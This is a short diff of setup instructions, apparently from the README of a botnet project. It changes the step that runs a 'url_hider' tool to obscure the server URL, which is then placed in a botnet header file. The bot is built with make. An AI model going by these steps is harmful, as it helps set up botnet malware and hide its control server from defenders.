@@ -76,7 +76,7 @@ Client :
 
 cd BOT && make
 
-cd url_hider && ./url_hider "your url"
+cd url_hider && ./url_hider "your url without http ex : api.pandeo.fr"
 
 Edit includes/px_botnet.h 
                           - stringifer with your url hided
